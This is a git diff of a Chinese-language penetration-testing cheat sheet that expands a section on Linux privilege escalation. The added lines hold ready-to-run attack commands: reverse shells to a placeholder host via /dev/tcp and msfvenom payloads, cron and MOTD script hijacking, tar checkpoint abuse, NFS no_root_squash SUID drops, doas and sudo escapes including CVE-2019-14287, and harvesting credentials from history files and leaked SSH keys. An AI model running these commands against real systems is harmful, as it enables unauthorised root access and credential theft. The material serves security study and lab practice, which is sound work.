@@ -766,7 +766,7 @@ gcc -fPIC -shared -nostartfiles -o shell.so shell.c
 # 寻找不需要密码就可以以root身份执行的程序
 sudo LD_PRELOAD=/tmp/shell.so find
 ```
-- 自动任务文件权限
+- 自动任务文件权限: [cron](00.basic/linux/cron)
 	- cat /etc/crontab
 	- 修改有root执行权限的脚本；写入reverse shell
 	- bash -i >& /dev/tcp/\<Host\>/4444 0>&1
@@ -779,7 +779,7 @@ chmod +xs /tmp/rootbash
 ```
 - 自动任务通配符
 	- 有root权限执行的脚本，固定在某路径tar打包文件
-	- 利用 --checkpoint 和 --checkpoint-action 提权
+	- 利用 [tar](00.basic/linux/tar) 命令的 --checkpoint 和 --checkpoint-action 提权
 ```bash
 # on host
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Host> LPORT=4444 -f elf -o rshell.out # and send to target machine
@@ -801,13 +801,81 @@ touch --checkpoint-action=exec=rshell.out
 - SUID 环境变量利用
 - SUID-shell 功能利用
 - 密码和密钥历史文件
+	- history
+	- cat ~/.\*history | less
+	- cat ~/.viminfo
+	- e.g. mysql -h somehost.local -uroot -ppassword123
 - 密码和密钥配置文件查看
+	- 配置文件概要
+		- vpn (.ovpn)
+		- ssh (.ssh)
 - SSH 密钥敏感信息
-- NFS 提权
+	- 寻找泄露的私钥
+	- touch id_rsa && vim id_rsa && chmod 600 id_rsa
+	- ssh -i id_rsa root@\<IP\>
+		- \[-oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dds\]
+		- \[-oHostKeyAlgorithms=ssh-rsa,ssh-dds\]
+- [NFS](00.basic/service/nfs) 提权
+	- cat /etc/exports
+```bash
+# Remote
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+# Host on root
+mkdir /tmp/nfs
+##`-o`后面跟着一系列以逗号分隔的选项，用于指定文件系统的挂载参数
+##`rw`表示将文件系统以读写模式挂载
+##`vers=3`表示使用NFS版本3来挂载文件系统
+mount -o rw,vers=3 <remote_ip>:/tmp /tmp/nfs
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +xs shell.elf
+```
 - 内核利用
-- doas less+vi
-- MOTD 机制利用
+	- linpeas扫描，内核版本低时可能有内核漏洞
+	- searchsploit -m 40611 40839
+- [doas](00.basic/linux/doas) less+vi
+	- freedsd, openbsd
+	- find / -perm -u=s -type f 2>/dev/null: /usr/bin/doas
+	- cat /etc/doas.conf
+	- doas /usr/bin/less /var/log/authlog. v(use vi to edit this file)
+	- :!sh
+- [MOTD](00.basic/linux/motd) 机制利用
+	- vim /etc/update-motd.d/00-header 写入rshell
+	- bash -c "bash -i >& /dev/tcp/\<host_ip\>/4444 0>&1"
 - 可预测 PRNG 暴力破解 SSH
+	- 公钥放在服务器端，私钥放在用户端，连接方式：用私钥去连接公钥
+	- cat ~/.ssh/authorized_keys
+	- searchsploit prng (pseudo random number generator 伪随机数生成器)
+	- searchsploit -m 5622.txt
+
+## sudo 提权利用
+
+- Reference: [GTFOBins](https://gtfobins.github.io)
+- [sudo](00.basic/linux/sudo) 使用概要
+- (ALL, !root) NOPASSWD: /bin/bash
+	- sudo version <= 1.8.27, security bypass
+	- cve-2019-14287
+```bash
+sudo -u#-1 /bin/bash
+```
+- apt
+```bash
+sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
+```
+- apache2
+```bash
+# 报错信息泄露
+sudo apache2 -f /etc/shadow
+```
+- ash
+```bash
+# ash 本身就是一个 shell
+sudo ash
+```
+- awk
+```bash
+sudo awk 'BEGIN {system("/bin/sh")}'
+```
 
 # 4. Post Pentest
 
